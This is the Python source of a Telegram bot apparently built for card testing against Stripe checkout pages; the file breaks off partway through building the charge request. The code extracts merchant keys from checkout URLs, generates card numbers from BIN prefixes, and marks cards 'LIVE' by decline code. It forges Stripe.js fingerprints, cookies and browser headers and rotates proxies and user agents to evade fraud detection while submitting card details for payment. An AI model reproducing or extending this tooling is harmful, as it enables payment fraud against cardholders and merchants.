import time
import random
import re
import aiohttp
import base64
import asyncio
import json
import os
import uuid
import string
from urllib.parse import unquote
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

from config import SERVER_ID

router = Router()

ALLOWED_GROUP = -1003414533097
OWNER_ID = 6957681631

# Server flag emojis
SERVER_FLAGS = {
    'us1': '🇺🇸 US1', 'us2': '🇺🇸 US2', 'us3': '🇺🇸 US3',
    'nl': '🇳🇱 NL', 'neth': '🇳🇱 NETH',
    'sg': '🇸🇬 SG', 'jp': '🇯🇵 JP',
    'de': '🇩🇪 DE', 'uk': '🇬🇧 UK', 'fr': '🇫🇷 FR',
    'id': '🇮🇩 ID', 'in': '🇮🇳 IN', 'au': '🇦🇺 AU',
    'co': '🌐 BOT',
}
SERVER_DISPLAY = SERVER_FLAGS.get(SERVER_ID, f'🌐 {SERVER_ID.upper()}')
CMD_NAME = SERVER_ID  # command name = server id
PROXY_FILE = "proxies.json"

USER_AGENTS = [
    # Chrome Windows (various versions)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    # Chrome Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    # Edge Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    # Edge Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    # Firefox Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0",
    # Firefox Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    # Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    # Opera Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 OPR/114.0.0.0",
]

# Stripe.js version patterns — real version numbers from CDN
STRIPE_JS_VERSIONS = [
    "v3", "v3.1", "v3.2", "v3.3", "v3.4", "v3.5",
]

# Per-user persistent fingerprints (muid stays same per machine)
_user_fingerprints = {}

def _detect_browser_info(ua: str) -> dict:
    """Extract browser name, version, and platform from user agent string."""
    info = {"browser": "Chrome", "version": "131", "platform": "Windows"}
    
    # Detect platform
    if "Macintosh" in ua or "Mac OS X" in ua:
        info["platform"] = "macOS"
    elif "Linux" in ua:
        info["platform"] = "Linux"
    else:
        info["platform"] = "Windows"
    
    # Detect browser + version
    import re
    if "Edg/" in ua:
        info["browser"] = "Edge"
        m = re.search(r'Edg/(\d+)', ua)
        if m: info["version"] = m.group(1)
    elif "OPR/" in ua:
        info["browser"] = "Opera"
        m = re.search(r'Chrome/(\d+)', ua)
        if m: info["version"] = m.group(1)
    elif "Firefox/" in ua:
        info["browser"] = "Firefox"
        m = re.search(r'Firefox/(\d+)', ua)
        if m: info["version"] = m.group(1)
    elif "Safari/" in ua and "Chrome" not in ua:
        info["browser"] = "Safari"
        m = re.search(r'Version/(\d+)', ua)
        if m: info["version"] = m.group(1)
    else:
        info["browser"] = "Chrome"
        m = re.search(r'Chrome/(\d+)', ua)
        if m: info["version"] = m.group(1)
    
    return info

def get_headers(stripe_js: bool = False) -> dict:
    """Return headers mimicking Stripe.js browser requests."""
    ua = random.choice(USER_AGENTS)
    headers = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://checkout.stripe.com",
        "referer": "https://checkout.stripe.com/",
        "user-agent": ua
    }
    if stripe_js:
        browser = _detect_browser_info(ua)
        v = browser["version"]
        platform = browser["platform"]
        
        headers["accept-language"] = random.choice([
            "en-US,en;q=0.9",
            "en-US,en;q=0.9,id;q=0.8",
            "en-GB,en;q=0.9,en-US;q=0.8",
            "en-US,en;q=0.9,nl;q=0.8",
            "en-US,en;q=0.9,de;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8",
            "en-US,en;q=0.9,ja;q=0.8",
        ])
        headers["sec-fetch-dest"] = "empty"
        headers["sec-fetch-mode"] = "cors"
        headers["sec-fetch-site"] = "same-site"
        
        # Dynamic sec-ch-ua based on actual browser
        if browser["browser"] in ("Chrome", "Edge", "Opera"):
            not_a_brands = [
                '"Not(A:Brand";v="24"',
                '"Not_A Brand";v="8"',
                '"Not/A)Brand";v="8"',
                '"Not A(Brand";v="99"',
                '"Not)A;Brand";v="99"',
            ]
            not_a = random.choice(not_a_brands)
            if browser["browser"] == "Edge":
                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Microsoft Edge";v="{v}"'
            elif browser["browser"] == "Opera":
                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Opera";v="{v}"'
            else:
                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Google Chrome";v="{v}"'
            headers["sec-ch-ua-mobile"] = "?0"
            headers["sec-ch-ua-platform"] = f'"{platform}"'
        # Firefox/Safari don't send sec-ch-ua
    
    return headers

def _generate_stripe_hash() -> str:
    """Generate a realistic Stripe.js content hash (matches real CDN hash format)."""
    # Real Stripe hashes are 10-char hex from build hash
    return ''.join(random.choices('0123456789abcdef', k=10))

def get_random_stripe_js_agent() -> str:
    """Get a Stripe.js payment_user_agent mimicking real browser."""
    build_hash = _generate_stripe_hash()
    return f"stripe.js%2F{build_hash}%3B+stripe-js-v3%2F{build_hash}%3B+checkout"

def generate_stripe_fingerprints(user_id: int = None) -> dict:
    """Generate Stripe.js fingerprint identifiers.
    muid is persistent per user (like browser cookies).
    guid is per-page-load. sid is per-session."""
    def _rand_hex(length: int) -> str:
        return ''.join(random.choices(string.hexdigits[:16], k=length))
    
    def _uuid_format():
        return f"{_rand_hex(8)}-{_rand_hex(4)}-4{_rand_hex(3)}-{random.choice('89ab')}{_rand_hex(3)}-{_rand_hex(12)}"
    
    # muid persistent per user (simulates __stripe_mid cookie)
    if user_id and user_id in _user_fingerprints:
        muid = _user_fingerprints[user_id]
    else:
        muid = _uuid_format()
        if user_id:
            _user_fingerprints[user_id] = muid
    
    # guid = per page load, sid = per session (regenerate each charge)
    guid = _uuid_format()
    sid = _uuid_format()
    
    return {"muid": muid, "guid": guid, "sid": sid}

def generate_eid() -> str:
    """Generate a valid UUID v4 for the eid parameter."""
    return str(uuid.uuid4())

def get_stripe_cookies(fp: dict) -> str:
    """Generate Stripe cookie header mimicking real browser."""
    return f"__stripe_mid={fp['muid']}; __stripe_sid={fp['sid']}"

_session = None

def load_proxies() -> dict:
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_proxies(data: dict):
    with open(PROXY_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def parse_proxy_format(proxy_str: str) -> dict:
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
    
    try:
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, host_part = proxy_str.rsplit('@', 1)
                if ':' in auth_part:
                    result["user"], result["password"] = auth_part.split(':', 1)
                if ':' in host_part:
                    result["host"], port_str = host_part.rsplit(':', 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    
    return result

def get_proxy_url(proxy_str: str) -> str:
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            return f"http://{parsed['user']}:{parsed['password']}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None

def get_user_proxies(user_id: int) -> list:
    proxies = load_proxies()
    user_data = proxies.get(str(user_id), [])
    if isinstance(user_data, str):
        return [user_data] if user_data else []
    return user_data if isinstance(user_data, list) else []

def add_user_proxy(user_id: int, proxy: str):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key not in proxies:
        proxies[user_key] = []
    elif isinstance(proxies[user_key], str):
        proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
    
    if proxy not in proxies[user_key]:
        proxies[user_key].append(proxy)
    save_proxies(proxies)

def remove_user_proxy(user_id: int, proxy: str = None):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key in proxies:
        if proxy is None or proxy.lower() == "all":
            del proxies[user_key]
        else:
            if isinstance(proxies[user_key], list):
                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
                if not proxies[user_key]:
                    del proxies[user_key]
            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
                del proxies[user_key]
        save_proxies(proxies)
        return True
    return False

def get_global_proxies() -> list:
    proxies = load_proxies()
    data = proxies.get("global", [])
    return data if isinstance(data, list) else []

def add_global_proxy(proxy: str):
    proxies = load_proxies()
    if "global" not in proxies:
        proxies["global"] = []
    if proxy not in proxies["global"]:
        proxies["global"].append(proxy)
    save_proxies(proxies)

def remove_global_proxy(proxy: str = None):
    proxies = load_proxies()
    if "global" in proxies:
        if proxy is None or proxy.lower() == "all":
            del proxies["global"]
        else:
            proxies["global"] = [p for p in proxies["global"] if p != proxy]
            if not proxies["global"]:
                del proxies["global"]
        save_proxies(proxies)
        return True
    return False

def get_user_proxy(user_id: int) -> str:
    # User proxies first, then global proxies as fallback
    user_proxies = get_user_proxies(user_id)
    global_proxies = get_global_proxies()
    all_proxies = user_proxies + global_proxies
    if all_proxies:
        return random.choice(all_proxies)
    return None

def obfuscate_ip(ip: str) -> str:
    if not ip:
        return "N/A"
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
    return "N/A"

async def get_proxy_info(proxy_str: str = None, timeout: int = 10) -> dict:
    result = {
        "status": "dead",
        "ip": None,
        "ip_obfuscated": None,
        "country": None,
        "city": None,
        "org": None,
        "using_proxy": False
    }
    
    proxy_url = None
    if proxy_str:
        proxy_url = get_proxy_url(proxy_str)
        result["using_proxy"] = True
    
    try:
        async with aiohttp.ClientSession() as session:
            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            
            async with session.get("http://ip-api.com/json", **kwargs) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["ip"] = data.get("query")
                    result["ip_obfuscated"] = obfuscate_ip(data.get("query"))
                    result["country"] = data.get("country")
                    result["city"] = data.get("city")
                    result["org"] = data.get("isp")
    except:
        result["status"] = "dead"
    
    return result

async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
    result = {
        "proxy": proxy_str,
        "status": "dead",
        "response_time": None,
        "external_ip": None,
        "error": None
    }
    
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    
    try:
        start = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                elapsed = round((time.perf_counter() - start) * 1000, 2)
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["response_time"] = f"{elapsed}ms"
                    result["external_ip"] = data.get("query")
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
    except Exception as e:
        result["error"] = str(e)[:30]
    
    return result

async def check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
    semaphore = asyncio.Semaphore(max_threads)
    
    async def check_with_semaphore(proxy):
        async with semaphore:
            return await check_proxy_alive(proxy)
    
    tasks = [check_with_semaphore(p) for p in proxies]
    return await asyncio.gather(*tasks)

async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=20, connect=5)
        )
    return _session

def get_currency_symbol(currency: str) -> str:
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

def format_time(seconds: float) -> str:
    if seconds < 60:
        return f"{seconds:.2f}s"
    mins = int(seconds // 60)
    secs = seconds % 60
    return f"{mins}m {secs:.2f}s"

CARD_SEPARATOR = "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"
STATUS_EMOJIS = {
    'CHARGED': '😎', 'LIVE': '✅', 'DECLINED': '🥲', '3DS': '😡',
    'ERROR': '💀', 'FAILED': '💀', 'UNKNOWN': '❓'
}

# Decline codes that mean the card is LIVE (valid number, wrong details)
LIVE_DECLINE_CODES = {
    'incorrect_cvc', 'incorrect_zip', 'insufficient_funds',
    'invalid_cvc', 'card_velocity_exceeded', 'do_not_honor',
    'try_again_later', 'not_permitted', 'withdrawal_count_limit_exceeded',
}

def check_access(msg: Message) -> bool:
    if msg.chat.id == ALLOWED_GROUP:
        return True
    if msg.chat.type == "private" and msg.from_user.id == OWNER_ID:
        return True
    return False

def extract_checkout_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None

async def fetch_pk_from_page(url: str) -> str:
    """Fetch checkout page HTML and extract PK via regex (fallback method)."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers={
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }, timeout=aiohttp.ClientTimeout(total=15),
            allow_redirects=True, ssl=False) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    # Search for PK in various patterns found in Stripe checkout pages
                    pk_patterns = [
                        r'pk_(live|test)_[A-Za-z0-9]{20,}',
                        r'"apiKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
                        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
                        r'Stripe\(["\']?(pk_(?:live|test)_[A-Za-z0-9]+)["\']?\)',
                    ]
                    for pattern in pk_patterns:
                        pk_match = re.search(pattern, html)
                        if pk_match:
                            # If it's a group match, use group 1; otherwise group 0
                            pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
                            if pk.startswith('pk_'):
                                print(f"[DEBUG] PK extracted from page HTML: {pk[:20]}...")
                                return pk
    except Exception as e:
        print(f"[DEBUG] fetch_pk_from_page error: {str(e)[:50]}")
    return None

async def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        # Method 1: Decode from hash fragment (XOR decode)
        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)
            
            try:
                # Add base64 padding if needed
                padded = hash_decoded + '=' * (-len(hash_decoded) % 4)
                decoded_bytes = base64.b64decode(padded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
                
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
                    print(f"[DEBUG] PK decoded from hash: {result['pk'][:20]}...")
                
                site_match = re.search(r'https?://[^\s\"\'\'\<\>]+', xored)
                if site_match:
                    result["site"] = site_match.group(0)
            except:
                pass
        
        # Method 2: Fallback — fetch page HTML and extract PK
        if not result["pk"] and result["cs"]:
            print(f"[DEBUG] Hash decode failed/missing, trying page fetch fallback...")
            pk_from_page = await fetch_pk_from_page(url)
            if pk_from_page:
                result["pk"] = pk_from_page
            
    except:
        pass
    
    return result

def parse_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_card(line)
            if card:
                cards.append(card)
    return cards

def luhn_checksum(card_number: str) -> int:
    """Calculate Luhn checksum digit."""
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def generate_luhn_card(prefix: str, length: int = 16) -> str:
    """Generate a card number with valid Luhn checksum."""
    # Fill remaining digits (except last check digit) with random
    remaining = length - len(prefix) - 1
    if remaining < 0:
        remaining = 0
    body = prefix + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
    # Calculate check digit
    check_sum = luhn_checksum(body + '0')
    check_digit = (10 - check_sum) % 10
    return body + str(check_digit)

def generate_cards_from_bin(bin_str: str, count: int = 10) -> list:
    """Generate random cards from a BIN prefix (6-12 digits). Max 10 cards."""
    bin_str = re.sub(r'\D', '', bin_str)
    if len(bin_str) < 6 or len(bin_str) > 12:
        return []
    
    count = min(count, 10)
    cards = []
    generated_numbers = set()
    
    # Determine card length based on BIN
    if bin_str.startswith('3'):
        card_length = 15  # Amex
    else:
        card_length = 16
    
    # Determine CVV length
    cvv_length = 4 if bin_str.startswith('3') else 3
    
    attempts = 0
    while len(cards) < count and attempts < 100:
        attempts += 1
        cc = generate_luhn_card(bin_str, card_length)
        if cc in generated_numbers:
            continue
        generated_numbers.add(cc)
        
        # Random expiry: month 01-12, year current+1 to current+5
        month = f"{random.randint(1, 12):02d}"
        year = f"{random.randint(26, 35)}"
        cvv = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
        
        cards.append({
            "cc": cc,
            "month": month,
            "year": year,
            "cvv": cvv
        })
    
    return cards

def is_bin_input(text: str) -> bool:
    """Check if text looks like a BIN (6-12 digits only)."""
    cleaned = re.sub(r'\D', '', text.strip())
    return 6 <= len(cleaned) <= 12

async def get_checkout_info(url: str) -> dict:
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_name": None,
        "customer_email": None,
        "support_email": None,
        "support_phone": None,
        "cards_accepted": None,
        "success_url": None,
        "cancel_url": None,
        "init_data": None,
        "error": None,
        "time": 0
    }
    
    try:
        decoded = await decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if result["pk"] and result["cs"]:
            s = await get_session()
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                headers=get_headers(),
                data=body
            ) as r:
                init_data = await r.json()
            
            if "error" not in init_data:
                result["init_data"] = init_data
                
                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["support_email"] = acc.get("support_email")
                result["support_phone"] = acc.get("support_phone")
                result["country"] = acc.get("country")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                    if lig.get("line_items"):
                        items = lig["line_items"]
                        currency = lig.get("currency", "").upper()
                        sym = get_currency_symbol(currency)
                        product_parts = []
                        for item in items:
                            qty = item.get("quantity", 1)
                            name = item.get("name", "Product")
                            amt = item.get("amount", 0) / 100
                            interval = item.get("recurring_interval")
                            if interval:
                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                            else:
                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                        result["product"] = ", ".join(product_parts)
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()
                
                mode = init_data.get("mode", "")
                if mode:
                    result["mode"] = mode.upper()
                elif init_data.get("subscription"):
                    result["mode"] = "SUBSCRIPTION"
                else:
                    result["mode"] = "PAYMENT"
                
                cust = init_data.get("customer") or {}
                result["customer_name"] = cust.get("name")
                result["customer_email"] = init_data.get("customer_email") or cust.get("email")
                
                pm_types = init_data.get("payment_method_types") or []
                if pm_types:
                    cards = [t.upper() for t in pm_types if t != "card"]
                    if "card" in pm_types:
                        cards.insert(0, "CARD")
                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
                
                result["success_url"] = init_data.get("success_url")
                result["cancel_url"] = init_data.get("cancel_url")
            else:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
        else:
            result["error"] = "Could not decode PK/CS from URL"
            
    except Exception as e:
        result["error"] = str(e)
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, user_id: int = None, max_retries: int = 2) -> dict:
    """Charge card using Stripe.js emulation — direct confirm with fingerprints."""
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    print(f"\n[DEBUG] Card: {card_display}")
    
    for attempt in range(max_retries + 1):
        try:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)
                
                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"
                
                if attempt > 0:
                    print(f"[DEBUG] Retry attempt {attempt}...")
                
                # Generate Stripe.js fingerprints (muid persistent per user)
                fp = generate_stripe_fingerprints(user_id)
                time_on_page = random.randint(15000, 120000)
                eid = generate_eid()
                
                print(f"[DEBUG] Stripe.js Emulation: Confirming directly with fingerprints...")
                
                # Build confirm body — Stripe.js style with full card data + fingerprints
                conf_body = (
                    f"eid={eid}"
                    f"&payment_method_data[type]=card"
                    f"&payment_method_data[card][number]={card['cc']}"
                    f"&payment_method_data[card][cvc]={card['cvv']}"
                    f"&payment_method_data[card][exp_month]={card['month']}"
                    f"&payment_method_data[card][exp_year]={card['year']}"
                    f"&payment_method_data[billing_details][name]={name}"
                    f"&payment_method_data[billing_details][email]={email}"
                    f"&payment_method_data[billing_details][address][country]={country}"
                    f"&payment_method_data[billing_details][address][line1]={line1}"
                    f"&payment_method_data[billing_details][address][city]={city}"
                    f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
                    f"&payment_method_data[billing_details][address][state]={state}"
                    f"&payment_method_data[guid]={fp['guid']}"
